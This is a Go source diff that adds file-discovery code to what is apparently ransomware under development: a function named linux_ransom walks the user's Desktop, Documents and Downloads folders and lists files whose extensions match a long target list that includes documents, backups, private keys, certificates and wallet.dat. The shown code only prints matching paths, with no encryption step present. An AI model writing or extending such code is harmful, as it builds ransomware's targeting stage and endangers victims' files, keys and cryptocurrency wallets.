@@ -1,5 +1,11 @@
 package modules
 
+import (
+	"fmt"
+	"os"
+	"path/filepath"
+)
+
 var extensions = []string{".mp4", ".avi", ".mp3", ".jpg", ".odt", ".mid", ".wma", ".flv",
 	".mkv", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf",
 	".wav", ".qcow2", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".tbk", ".bak", ".djv",
@@ -17,6 +23,28 @@ var extensions = []string{".mp4", ".avi", ".mp3", ".jpg", ".odt", ".mid", ".wma"
 	".DOC", ".pem", ".csr", ".crt", ".key", "wallet.dat",
 }
 
-func ransom() {
+var locationsToLook = []string{"/Desktop/", "/Documents/", "/Downloads/"}
 
+func visit(path string, f os.FileInfo, err error) error {
+	fmt.Printf("Visited: %s\n", path)
+
+	for _, b := range extensions {
+		if filepath.Ext(path) == b {
+			fmt.Printf("%s\n", path)
+		}
+	}
+	return nil
+}
+
+func linux_ransom() {
+	home_location := os.Getenv("HOME")
+	for _, location := range locationsToLook {
+		err := filepath.Walk(home_location+location, visit)
+		fmt.Printf("filepath.Walk() returned %v\n", err)
+	}
+
+}
+
+func main() {
+	linux_ransom()
 }
